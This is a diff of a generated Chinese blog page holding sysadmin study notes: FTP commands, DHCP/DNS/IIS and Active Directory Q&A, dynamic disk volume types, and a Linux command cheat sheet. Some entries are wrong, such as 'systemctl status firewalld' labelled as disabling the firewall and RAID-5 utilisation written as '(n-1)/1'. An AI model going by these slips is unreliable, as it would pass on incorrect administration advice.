-<p>\22. mls remote-file local-file：同nlist，但可指定多个文件名</p>
-<p>\23. mput local-file：将多个文件传输至远程主机。</p>
-<p>\24. open host[port]：建立指定ftp服务器连接，可指定连接端口</p>
-<p>\25. prompt：设置多个文件传输时的交互提示</p>
-<p>\26. put local-file[remote-file]：将本地文件local-file传送至远程主机。</p>
-<p>\27. pwd：显示远程主机的当前工作目录。</p>
-<p>\28. quit：同bye，退出ftp会话。</p>
-<p>\29. quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</p>
-<p>\30. recv remote-file[local-file]：同get。</p>
-<p>\31. rename[from][to]：更改远程主机文件名。</p>
-<p>\32. rmdir dir-name：删除远程主机目录。</p>
-<p>\33. send local-file[remote-file]：同put。</p>
-<p>\34. status：显示当前ftp状态。</p>
-<p>\35. trace：设置包跟踪</p>
-<p>\36. type[type-name]：设置文件传输类型为type-name，缺省为ascii，如：type binary，设置二进制传输方式。</p>
-<p>\37. verbose：同命令行的-v参数，即设置详尽报告方式，ftp服务器的所有响应都将显示给用户，缺省为on.</p>
-<p>\38. user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，</p>
-<ol>
-<li>Dhcp服务器的租约过程以及更新租约时间</li>
-</ol>
-<p>答：①客户端请求IP：发送discover广播包，源ip地址0.0.0.0 目标地址255.255.255.255</p>
-<p>②服务器端响应：发送offer包，源ip地址 192.168.1. 1 目标地址255.255.255.255 提供ip地址 192.168.1.12</p>
-<p>③客户端选择ip：发送request包，选择dhcp服务器192.168.1.1 源ip地址0.0.0.0 目标ip地址 255.255.255.255 租约期限 8</p>
-<p>④服务器确定租约 发送ACK确认 源地址192.168.1.1 目标地址255.255.255.255</p>
-<p>租约时间的50%和87.5%</p>
-<ol>
-<li>Client获取IP地址后,重启计算机是如何续约地址的?如果ip已经不可用和可用服务器分别如何回应?</li>
-</ol>
-<p>答：重启时客户端发送带有ip地址的request请求到服务器。如果ip可用，服务器发送ACK确认信息，ip继续使用；如果ip已经分配使用，服务器发送NACK，然后客户端重新发送DHCP Discover广播包</p>
-<ol>
-<li>画图描述DNS的解析过程(标出递归查询和迭代查询)</li>
-</ol>
-<p>答：</p>
-<ol>
-<li>DNS的正向解析和反向解析分别是什么意思</li>
-</ol>
-<p>答：正向：由域名解析出ip 反向：由ip解析出域名</p>
-<ol>
-<li>DNS服务器的分类,以及各自的特点</li>
-</ol>
-<p>答：主要名称服务器：数据全</p>
-<p>辅助名称服务器：数据是从主dns服务器中同步过来的，无法更改</p>
-<p>Cache-Only（缓存）名称服务器：速度快，由其他服务器提供dns解析将数据存于告诉缓存中。缓存需要经常释放，否则主服务器改动之后就会解析错误</p>
-<p>主控名称服务器：提供趋于数据复制的服务器</p>
-<ol>
-<li>DNS辅助DNS同步区域文件需要注意什么</li>
-</ol>
-<p>答：要在主DNS的属性区域传送中选中只允许到下列服务器，编辑辅助DNS的IP地址，然后在辅助DNS服务器上右键，从主DNS上传输即可</p>
-<ol>
-<li>Web服务器的安装程序是什么</li>
-</ol>
-<p>答：IIS web平台安装程序是一个非常酷的产品是一个很小的下载管理程序 - 微软Web平台安装程序（Microsoft Web Platform Installer），它极大地简化了web服务器和web开发设施的安装和配置。它可在Windows XP, Vista, Windows 7, Windows Server 2003 和 Windows Server 2008下工作。</p>
-<ol>
-<li>IIs程序中默认文档的作用</li>
-</ol>
-<p>答：直接访问网站首页</p>
-<ol>
-<li>如何实现一台WEB服务器提供多个网站(三种方式)</li>
-</ol>
-<p>答：相同IP不同端口</p>
-<p>相同端口不同IP</p>
-<p>相同端口 IP不同主机名</p>
-<ol>
-<li>MBR分区方式的硬盘为什么只能划分四个主分区?</li>
-</ol>
-<p>答：个分区信息占用16字节，总64字节。最多四个主分区</p>
-<ol>
-<li>写出动态磁盘的优点</li>
-</ol>
-<p>答：可扩展性：随时展开文件系统的管理空间</p>
-<p>高读写性：动态磁盘中卷由多个硬盘组成，提高读写性</p>
-<p>高可靠性：防止某个磁盘损坏造成数据丢失   </p>
-<ol>
-<li>写出动态磁盘卷的分类以及各自的特点(画表对比)</li>
-</ol>
-<p>答：</p>
-<table>
-<thead>
-<tr>
-<th>分类</th>
-<th>磁盘个数</th>
-<th>每个磁盘提供的空间是否一致</th>
-<th>可扩展性</th>
-<th>读写性</th>
-<th>容错</th>
-<th>空间利用率</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>简单卷</td>
-<td>1</td>
-<td>——</td>
-<td>可</td>
-<td>正常</td>
-<td>无</td>
-<td>100%</td>
-</tr>
-<tr>
-<td>跨区卷</td>
-<td>2-32</td>
-<td>否</td>
-<td>可</td>
-<td>正常</td>
-<td>无</td>
-<td>100%</td>
-</tr>
-<tr>
-<td>带区卷</td>
-<td>2-32</td>
-<td>是</td>
-<td>否</td>
-<td>最快</td>
-<td>无</td>
-<td>100%</td>
-</tr>
-<tr>
-<td>镜像卷</td>
-<td>只能2个</td>
-<td>是</td>
-<td>否</td>
-<td>正常</td>
-<td>有</td>
-<td>50%</td>
-</tr>
-<tr>
-<td>Raid-5卷</td>
-<td>3-32</td>
-<td>是</td>
-<td>否</td>
-<td>较快</td>
-<td>有</td>
-<td>（n-1）/1</td>
-</tr>
-</tbody></table>
-<ol>
-<li>介绍一下以下相关域的概念</li>
-</ol>
-<p>域：</p>
-<p>活动目录的一种实现形式，属于活动目录中的核心管理单位，由域控制器和成员计算机组成</p>
-<p>AD：</p>
-<p>活动目录</p>
-<p>DC：</p>
-<p>域控制器</p>
-<p>OU：</p>
-<p>组织单位在容器中的称呼，可以存放一些对象和其他容器</p>
-<p>功能级别：</p>
-<p>域功能级别：限制域控制器的功能级别 林功能级别：限制林功能级别</p>
-<p>组策略：</p>
-<p>策略的集合，用于统一修改、设置程序</p>
-<ol>
-<li>写出DC的基本条件</li>
-</ol>
-<p>答：管理员权限；操作系统版本Windows Server 2003（Web版除外）、Windows Server 2008（Web版除外）、Windows Server 2008 R2（Web和Itanium版除外）；NTFS分区；静态ip；有足够可用的磁盘空间</p>
-<ol>
-<li>写出加入域的基本条件</li>
-</ol>
-<p>答：计算机IP地址设置正确，DNS配置正确；计算机能与域控制器互相连通</p>
-<ol>
-<li>写出卸载域的注意事项</li>
-</ol>
-<p>答：卸载域控制器之前，所有域控制器要相互联机，如果域内还有其他域控制器，则该计算机将会下降为成员服务器；如果该域控制器是域内最后一个域控制器，则该计算器降级为独立服务器，如果该域控制器担任了“全局编录”的角色，实施卸载前，先确认网络中还有其他域控制器承担这个角色，否则将影响用户的登录。</p>
-<ol>
-<li>写出组策略的应用规则</li>
-</ol>
-<p>答：策略继承与阻止：级容器可以继承或阻止应用其上级容器的GPO设置</p>
-<p>策略累加与冲突：多个GPO设置可以累加或发生冲突被覆盖（如果多个组策略设置不冲突，则最终的有效策略是所有组策略设置的累加；如果多个组策略设置冲突，则后应用的组策略覆盖先应用的组策略。）</p>
-<p>策略强制生效：使下级容器强制执行其上级容器的GPO设置</p>
-<p>筛选：阻止一个容器内的用户或计算机应用其GPO设置</p>
-<p>组策略应用顺序：LSDOU首先应用本地组策略，如果有站点组策略，则应用，接着应用域策略，最后应用OU上的策略（如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。）</p>
-<ol>
-<li>写出漫游桌面实现的思路</li>
-</ol>
-<p>答：在一个域环境当中，通过添加一个OU，将需要统一桌面的用户添加进去，给OU添加GPO，在用户设置中，找到桌面设置，Active Desktop选择已启用，禁止修改桌面选择已启用，统一桌面选择已启用（照片的路径设置为\IP\文件夹名\XX.jpg，该文件夹一定要设置共享），然后更新策略。这样OU内的所有用户就能实现漫游桌面。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/windows-server-2008基础/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2200,6 +1248,15 @@ wbadmin start recovery -version:10/09/2018-02:14 -itemtype:volume -items:e: ----
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     8.7k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     36 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -2245,6 +1302,37 @@ wbadmin start recovery -version:10/09/2018-02:14 -itemtype:volume -items:e: ----
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  8.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  36
+                </span>
+              
+            </div>
+          
 
           
 
@@ -2262,441 +1350,14 @@ wbadmin start recovery -version:10/09/2018-02:14 -itemtype:volume -items:e: ----
 
       
         
-          
-            <h1 id="Linux常用基本命令"><a href="#Linux常用基本命令" class="headerlink" title="Linux常用基本命令:"></a>Linux常用基本命令:</h1><h4 id="1-网络测试命令"><a href="#1-网络测试命令" class="headerlink" title="(1)网络测试命令:"></a>(1)网络测试命令:</h4><p> ping   192.168.1.1     //不会自动停,要Ctrl+C停止.<br> Ctrl+l    清屏<br>远程登录的方式:远程桌面/Telnet/SSH/;<br>Telnet和SSH最大的区别是:传输数据包的时候是否进行加密.<br>Telnet在传输过程中数据不加密—-明文传输;<br>SSH在传输过程中对数据进行加密—-密文传输;<br>ifconfig    //查看所有网卡的信息<br>ifconfig ens32    //只查看某一个网卡的信息<br>vim  是linux中的一个编辑器,类似于windows中的记事本.    </p>
-<h5 id="第一步-给Linux配置IP-并生效"><a href="#第一步-给Linux配置IP-并生效" class="headerlink" title="第一步:给Linux配置IP,并生效"></a>第一步:给Linux配置IP,并生效</h5><p>vim /etc/sysconfig/network-scripts/ifcfg-ens32    //编辑网卡配置文件<br>vim   —–&gt;  i  可以进行编辑,编辑完成后—-&gt;Esc退出编辑—–&gt;保存:wq<br>BOOTPROTO=static   //获取IP的方式改为static静态<br>IPADDR=192.168.100.1   //配置IP<br>NETMASK=255.255.255.0    //配置子网掩码<br>GATEWAY=192.168.100.254    //配置网关<br>DNS=114.114.114.114<br>ONBOOT=yes //启用网卡</p>
-<h5 id="第二步-重启-使配置生效"><a href="#第二步-重启-使配置生效" class="headerlink" title="第二步:重启,使配置生效"></a>第二步:重启,使配置生效</h5><p>service network restart    //重新加载配置文件,生效<br>ifconfig ens32   //检查网卡信息<br>inet 192.168.100.1  netmask 255.255.255.0  broadcast 192.168.100.255   //第二行的IP信息,有才正常.</p>
-<h5 id="第三步-关闭Linux中的防火墙"><a href="#第三步-关闭Linux中的防火墙" class="headerlink" title="第三步:关闭Linux中的防火墙"></a>第三步:关闭Linux中的防火墙</h5><p>systemctl status firewalld           //关闭防火墙1<br>setenforce 0        //关闭selinux<br>getenforce       //查看selinux的状态</p>
-<h5 id="第四步-编辑vmware中NAT网卡的配置"><a href="#第四步-编辑vmware中NAT网卡的配置" class="headerlink" title="第四步:编辑vmware中NAT网卡的配置"></a>第四步:编辑vmware中NAT网卡的配置</h5><p>编辑—虚拟网卡编辑器—-修改网段为Linux中的网段—-NAT配置,修改网关为Linux中的网关.<br>第五步:在真机中开启VMNET8,并配置为相同网段的IP,例如:192.168.100.100<br>ping  192.168.100.1   测试网络连通性在真机安装可以远程管理的软件:putty/Xshell/SecureCRT</p>
-<h4 id="1-操作系统-内核-kernel-和外壳-shell"><a href="#1-操作系统-内核-kernel-和外壳-shell" class="headerlink" title="1.操作系统:内核(kernel)和外壳(shell)"></a>1.操作系统:内核(kernel)和外壳(shell)</h4><p>  shell:命令解释器,把用户输入的一些指令解析成kernel可以识别的”语言”.<br>  (1)Linux分为内核和外壳.<br>     安德鲁教授教学使用的Minix;<br>     Linus发布的是Linux的内核;<br>  (2)20世纪80年代的时候，1984年Richard  Stallman  发起了“自由软件运动”。<br>     项目名称叫做“GNU（GNU’s  not  unix）计划”，目的：就是开发一个开源免费的类Unix操作系统。<br>     FSF（Free Software Foundation）自由软件基金会，为了防止这个项目的软件被商业化，就有了GPL。<br>     GPL（通用公共许可证：GNU  General  Public License）核心思想：每个人有权获得，修改和重新发布源代码的权利，但是要把具体的改动发布出来</p>
-<h4 id="2-Linux基本命令"><a href="#2-Linux基本命令" class="headerlink" title="2.Linux基本命令:"></a>2.Linux基本命令:</h4><h5 id="1-网络测试命令-1"><a href="#1-网络测试命令-1" class="headerlink" title="(1)网络测试命令:"></a>(1)网络测试命令:</h5><p>​     ping   192.168.1.1            //不会自动停,要Ctrl+C停止.<br>​     Ctrl+l    清屏<br>​     Ctrl+u    清除整行的内容(光标到行首)<br>​     ctrl+K    清除整行到行尾<br>​     Esc+.     表示调用上一次命令的最后参数<br>​<br>​     </p>
-<pre><code> 远程登录的方式:远程桌面/Telnet/SSH/;  
- Telnet和SSH最大的区别是:传输数据包的时候是否进行加密.
- Telnet在传输过程中数据不加密----明文传输;
- SSH在传输过程中对数据进行加密----密文传输;
-
- ifconfig    //查看所有网卡的信息
-ifconfig ens32    //只查看某一个网卡的信息
-vim  是linux中的一个编辑器,类似于windows中的记事本.
-
-第一步:给Linux配置IP,并生效
-vim /etc/sysconfig/network-scripts/ifcfg-ens32    //编辑网卡配置文件
-vim   -----&gt;  i  可以进行编辑,编辑完成后----&gt;Esc退出编辑-----&gt;保存:wq
-BOOTPROTO=static        //获取IP的方式改为static静态
-IPADDR=192.168.100.1          //配置IP
-NETMASK=255.255.255.0        //配置子网掩码
-GATEWAY=192.168.100.254        //配置网关
-DNS=114.114.114.114
-ONBOOT=yes           //启用网卡
-第二步:重启,使配置生效
-service network restart    //重新加载配置文件,生效
-ifconfig ens32   //检查网卡信息
-    inet 192.168.100.1  netmask 255.255.255.0  broadcast 192.168.100.255   //第二行的IP信息,有才正常.
-第三步:关闭Linux中的防火墙
-systemctl status firewalld           //关闭防火墙1
-setenforce 0        //关闭selinux
-getenforce       //查看selinux的状态</code></pre><p>​<br>    第四步:编辑vmware中NAT网卡的配置<br>    编辑—虚拟网卡编辑器—-修改网段为Linux中的网段—-NAT配置,修改网关为Linux中的网关.</p>
-<pre><code>第五步:在真机中开启VMNET8,并配置为相同网段的IP,例如:192.168.100.100
-ping  192.168.100.1   测试网络连通性
-在真机安装可以远程管理的软件:putty/Xshell/SecureCRT
-
-注意:修改网卡配置需要管理员权限,切换用户的命令.    su - root    //su  -  用来切换用户,后边加用户名.
-
-第六步:如果想上网,就要能DNS解析
-vim /etc/resolv.conf</code></pre><h4 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3.基础命令:"></a>3.基础命令:</h4><h5 id="1-系统类查看命令"><a href="#1-系统类查看命令" class="headerlink" title="(1)系统类查看命令:"></a>(1)系统类查看命令:</h5><p>  [root@localhost ~]# uname  -r   //查看内核版本<br>    3.10.0-862.el7.x86_64      其中3是主版本号,除非内核发生结构性变化,一般不会修改<br>                                10是次版本号,<br>                                0代表对次版本的修改次数;<br>                                862是对系统的修订次数.<br>  [root@localhost ~]# uname -m         //查看系统位数<br>    x86_64<br>  [root@localhost ~]# uname -a       //查看内核详细信息,包括主机名/系统版本号/时间等</p>
-<p>  [root@localhost ~]# cat /etc/redhat-release   //查看系统版本<br>    CentOS Linux release 7.5.1804 (Core) </p>
-<p>  [root@localhost <del>]# pwd    //root表示当前的用户名,localhost表示主机名, ~ 表示家目录.<br>    /root<br>  [haha@localhost ~]$ pwd   //</del>表示家目录,如果是普通用户,那么家目录在/home/用户名<br>    /home/haha</p>
-<h5 id="2-开关机-重启的命令"><a href="#2-开关机-重启的命令" class="headerlink" title="(2)开关机,重启的命令"></a>(2)开关机,重启的命令</h5><p>  重启:reboot  ==  init 6 ==shutdown -r<br>  关闭:poweroff  ==  shutdown  -P    //关闭系统并关闭电源.</p>
-<h5 id="3-时间相关"><a href="#3-时间相关" class="headerlink" title="(3)时间相关:"></a>(3)时间相关:</h5><p>​    [root@localhost ~]# date         //查看当前时间<br>​    2019年 08月 09日 星期五 14:48:58 CST<br>​    [root@localhost ~]# date -s “20180101 15:00:00”         //修改时间<br>​    2018年 01月 01日 星期一 15:00:00 CST<br>​    [root@localhost ~]#<br>​    [root@localhost ~]# hwclock –show         //查看硬件时间<br>​    2019年08月09日 星期五 14时50分21秒  -1.029828 秒<br>​    [root@localhost ~]# hwclock –set –date=”2019/01/01 14:51:00”    //设置硬件时间<br>​    [root@localhost ~]# date +%F        //显示年月日<br>​    2019-08-09<br>​    [root@localhost ~]# date +%T      //显示时分秒<br>​    14:52:16<br>​    [root@localhost ~]# date +%w      //显示星期<br>​    5</p>
-<h5 id="4-查看当前登录用户"><a href="#4-查看当前登录用户" class="headerlink" title="(4)查看当前登录用户:"></a>(4)查看当前登录用户:</h5><p>  [root@localhost ~]# whoami   //我是谁<br>    root<br>    [root@localhost ~]# who        //查看当前登录用户<br>    root     pts/0        2019-08-09 00:59 (:0)     //图形化界面的”终端窗口”—本地登录<br>    root     :0           2019-08-09 00:59 (:0)    //图形化界面登录—本地登录<br>    haha     pts/2        2019-08-09 14:57 (192.168.100.100)    //远程登录,从192.168.100.100登录的</p>
-<pre><code>修改主机名:
-[root@localhost ~]# hostnamectl set-hostname CentOS7</code></pre><h5 id="4-系统文件路径相关问题"><a href="#4-系统文件路径相关问题" class="headerlink" title="4.系统文件路径相关问题"></a>4.系统文件路径相关问题</h5><h6 id="1-关于路径"><a href="#1-关于路径" class="headerlink" title="(1)关于路径;"></a>(1)关于路径;</h6><p>  从/开始的路径,叫做绝对路径.<br>  从当前路径开始的路径,叫做相对路径.</p>
-<h6 id="2-Linux中的系统路径-在Linux中-一切皆文件-包括目录和文件"><a href="#2-Linux中的系统路径-在Linux中-一切皆文件-包括目录和文件" class="headerlink" title="(2)Linux中的系统路径:在Linux中,一切皆文件(包括目录和文件)."></a>(2)Linux中的系统路径:在Linux中,一切皆文件(包括目录和文件).</h6><p>​      /boot    存放系统的引导文件<br>​      /bin     存放普通用户的一些命令<br>​      /dev     设备文件存储路径<br>​      /etc     存放系统中的配置文件*****<br>​      /home    普通用户的家目录<br>​      /root    root的家目录<br>​      /lib和/lib64是库文件<br>​      /media  目录：默认可移动设备的挂载路径，比如挂载U盘、光盘和移动硬盘（之前用/mnt目录挂载U盘）。<br>​        Linux中默认情况下,必须有一个/ 根分区,如果是其他外部设备是没有办法被操作系统识别的.如果Linux系统要识别某个设备,就要指定一个目录来”挂载”<br>​      /mnt 目录：临时挂载点。<br>​      /opt 目录：第三方应用程序安装位置。<br>​      /tmp 目录：系统运行的临时文件存放路径。用户都有访问权限。<br>​      /usr 目录：Universal Shared，read-only data；默认软件的安装目录，全局共享只读数据。很重要。<br>​            /usr/local ：本地层级结构，系统安装后一般是空的。取代/opt成为第三方应用程序的安装位置。<br>​      /var 目录：Variable Data Files可变数据的层级目录，存放经常变换数据的目录（比如日志）<br>​            /var/log ：日志目录</p>
-<h6 id="2-关于路径"><a href="#2-关于路径" class="headerlink" title="(2)关于路径;"></a>(2)关于路径;</h6><p>​      ln -s /etc/sysconfig/network-scripts/ifcfg-ens32 wangka    //给系统的网卡配置文件创建一个快捷方式,新的文件名为wangka<br>​      pwd       //显示当前路径<br>​      cd  ..    //切换到上级目录<br>​      cd  -     //切换到上次访问的目录</p>
-<h6 id="3-目录的相关操作"><a href="#3-目录的相关操作" class="headerlink" title="(3)目录的相关操作:"></a>(3)目录的相关操作:</h6><p>​      pwd       //显示当前路径<br>​      cd  ..    //切换到上级目录<br>​      cd  .        //一个点是当前路径<br>​      cd  -     //切换到上次访问的目录<br>​      </p>
-<pre><code>mkdir   /test    //创建一个目录
-cd     /test    //进入这个目录
-mkdir -p test1/test2/test3/test4   //递归创建,同时创建多层目录
-rm -rf test1/    //删除文件夹,-r表示递归删除;-f强制,没有提示信息.=====&gt;rm  -rf的参数,慎用!!!</code></pre><h6 id="4-文件相关操作"><a href="#4-文件相关操作" class="headerlink" title="(4)文件相关操作:"></a>(4)文件相关操作:</h6><p>​    touch   aaa.txt    //用touch的时候如果没有文件就直接创建;如果有,就更新文件的时间戳.<br>​    echo this is bbb2.txt &gt;&gt; bbb.txt    //向文件追加内容<br>​    cat bbb.txt            //查看文件内容<br>​    echo this is bbb2.txt &gt; bbb.txt    //用现在的内容直接”替换”原来的内容<br>​    echo <code>date +%F</code> &gt;&gt;aaa.txt     //echo 表示向文件写入内容,如果内容为命令,可以用反引号来引用(``)1前边的符号.</p>
-<pre><code>查看文件的命令:
-cat  bbb.txt     //显示文件的整个内容
-head  -1   bbb.txt   //查看文件第一行的内容
-tail  -1   bbb.txt   //查看文件最后一行的内容
-ls --help | more      //查看ls的帮助信息,并分页显示(more是只能向下翻页)
-ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可以向上/向下翻页)
-
-删除普通文件:   rm   aaa.txt  </code></pre><h6 id="5-ls-列出当前路径的文件"><a href="#5-ls-列出当前路径的文件" class="headerlink" title="(5)ls  列出当前路径的文件"></a>(5)ls  列出当前路径的文件</h6><p>​     ls   -l   /test  //以长格式显示/test目录的信息;如果后边不加路径,默认是当前路径下的文件<br>​     ls   -lh   aaa.txt    //-h 是以人类易读的方式显示文件大小;</p>
-<p>​     ls   -al        //-a 显示所有文件,包括隐藏文件</p>
-<p>  1.使用root和haha(或者之前创建的其他用户)同时登陆系统,查看当前有几个登陆用户;<br>  2.查看系统的时间,并修改为2019年10月1日;<br>  3.在/下创建一个目录/test ;<br>  4.在/test下创建几个文件,分别是time.txt   date.txt  week.txt<br>    把时分秒的执行结果写入到time.txt;<br>    把年月日的结果写入到date.txt;<br>    把星期几的结果写入到week.txt;<br>  5.使用cat命令检查,上边3个文件是否正常;<br>  6.在/test下创建多级子目录,层级关系为/test/test11/test22/test33;<br>    在/test/test11文件里创建11.txt文件,写入自己的名字和一首诗;<br>    使用命令查看写入的结果;<br>  7.查看系统内核版本和位数结果写入到/test/kernel.txt;<br>  8.查看当前系统版本,追加到/test/kernel.txt;<br>  9.查看当前用户的身份和用户名.<br>  10.修改主机名为自己的名字</p>
-<hr>
-<p>系统信息** </p>
-<p>arch 显示机器的处理器架构</p>
-<p>uname -m 显示机器的处理器架构</p>
-<p>uname -r 显示正在使用的内核版本 </p>
-<p>dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) </p>
-<p>hdparm -i /dev/hda 罗列一个磁盘的架构特性 </p>
-<p>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 </p>
-<p>cat /proc/cpuinfo 显示CPU info的信息 </p>
-<p>cat /proc/interrupts 显示中断 </p>
-<p>cat /proc/meminfo 校验内存使用 </p>
-<p>cat /proc/swaps 显示哪些swap被使用 </p>
-<p>cat /proc/version 显示内核的版本 </p>
-<p>cat /proc/net/dev 显示网络适配器及统计 </p>
-<p>cat /proc/mounts 显示已加载的文件系统 </p>
-<p>lspci -tv 罗列 PCI 设备 </p>
-<p>lsusb -tv 显示 USB 设备 </p>
-<p>date 显示系统日期 </p>
-<p>cal 2007 显示2007年的日历表 </p>
-<p>date 041217002007.00 设置日期和时间 - 月日时分年.秒 </p>
-<p>clock -w 将时间修改保存到 BIOS </p>
-<hr>
-<h4 id="关机-系统的关机、重启以及登出"><a href="#关机-系统的关机、重启以及登出" class="headerlink" title="关机 (系统的关机、重启以及登出 )"></a><strong>关机 (系统的关机、重启以及登出 )</strong></h4><p>shutdown -h now 关闭系统</p>
-<p>init 0 关闭系统</p>
-<p>telinit 0 关闭系统</p>
-<p>shutdown -h hours:minutes &amp; 按预定时间关闭系统 </p>
-<p>shutdown -c 取消按预定时间关闭系统 </p>
-<p>shutdown -r now 重启</p>
-<p>reboot 重启</p>
-<p>logout 注销 </p>
-<p>-———————————————————————————————</p>
-<h4 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a><strong>文件和目录</strong></h4><p>cd /home 进入 ‘/ home’ 目录’ </p>
-<p>cd .. 返回上一级目录 </p>
-<p>cd ../.. 返回上两级目录 </p>
-<p>cd 进入个人的主目录 </p>
-<p>cd ~user1 进入个人的主目录 </p>
-<p>cd - 返回上次所在的目录 </p>
-<p>pwd 显示工作路径 </p>
-<p>ls 查看目录中的文件 </p>
-<p>ls -F 查看目录中的文件 </p>
-<p>ls -l 显示文件和目录的详细资料 </p>
-<p>ls -a 显示隐藏文件 </p>
-<p>ls <em>[0-9]</em> 显示包含数字的文件名和目录名 </p>
-<p>tree 显示文件和目录由根目录开始的树形结构</p>
-<p>lstree 显示文件和目录由根目录开始的树形结构</p>
-<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’ </p>
-<p>mkdir dir1 dir2 同时创建两个目录 </p>
-<p>mkdir -p /tmp/dir1/dir2 创建一个目录树 </p>
-<p>rm -f file1 删除一个叫做 ‘file1’ 的文件’ </p>
-<p>rmdir dir1 删除一个叫做 ‘dir1’ 的目录’ </p>
-<p>rm -rf dir1 删除一个叫做 ‘dir1’ 的目录并同时删除其内容 </p>
-<p>rm -rf dir1 dir2 同时删除两个目录及它们的内容 </p>
-<p>mv dir1 new_dir 重命名/移动 一个目录 </p>
-<p>cp file1 file2 复制一个文件 </p>
-<p>cp dir/* . 复制一个目录下的所有文件到当前工作目录 </p>
-<p>cp -a /tmp/dir1 . 复制一个目录到当前工作目录 </p>
-<p>cp -a dir1 dir2 复制一个目录 </p>
-<p>ln -s file1 lnk1 创建一个指向文件或目录的软链接 </p>
-<p>ln file1 lnk1 创建一个指向文件或目录的物理链接 </p>
-<p>touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) </p>
-<p>file file1 outputs the mime type of the file as text </p>
-<p>iconv -l 列出已知的编码 </p>
-<p>iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding. </p>
-<p>find . -maxdepth 1 -name *.jpg -print -exec convert “{}” -resize 80x60 “thumbs/{}” ; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick) </p>
-<p>-———————————————————————————————</p>
-<h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a><strong>文件搜索</strong></h4><p>find / -name file1 从 ‘/‘ 开始进入根文件系统搜索文件和目录 </p>
-<p>find / -user user1 搜索属于用户 ‘user1’ 的文件和目录 </p>
-<p>find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件 </p>
-<p>find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件 </p>
-<p>find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </p>
-<p>find / -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限 </p>
-<p>find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备 </p>
-<p>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令 </p>
-<p>whereis halt 显示一个二进制文件、源码或man的位置 </p>
-<p>which halt 显示一个二进制文件或可执行文件的完整路径 </p>
-<p>-———————————————————————————————</p>
-<h4 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a><strong>挂载一个文件系统</strong></h4><p>mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 ‘/ mnt/hda2’ 已经存在 </p>
-<p>umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 ‘/ mnt/hda2’ 退出 </p>
-<p>fuser -km /mnt/hda2 当设备繁忙时强制卸载 </p>
-<p>umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 </p>
-<p>mount /dev/fd0 /mnt/floppy 挂载一个软盘 </p>
-<p>mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom </p>
-<p>mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom </p>
-<p>mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom </p>
-<p>mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 </p>
-<p>mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 </p>
-<p>mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 </p>
-<p>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 </p>
-<p>-———————————————————————————————</p>
-<h4 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a><strong>磁盘空间</strong></h4><p>df -h 显示已经挂载的分区列表 </p>
-<p>ls -lSr |more 以尺寸大小排列文件和目录 </p>
-<p>du -sh dir1 估算目录 ‘dir1’ 已经使用的磁盘空间’ </p>
-<p>du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </p>
-<p>rpm -q -a –qf ‘%10{SIZE}t%{NAME}n’ | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) </p>
-<p>dpkg-query -W -f=’${Installed-Size;10}t${Package}n’ | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) </p>
-<p>-———————————————————————————————</p>
-<h4 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a><strong>用户和群组</strong></h4><p>groupadd group_name 创建一个新用户组 </p>
-<p>groupdel group_name 删除一个用户组 </p>
-<p>groupmod -n new_group_name old_group_name 重命名一个用户组 </p>
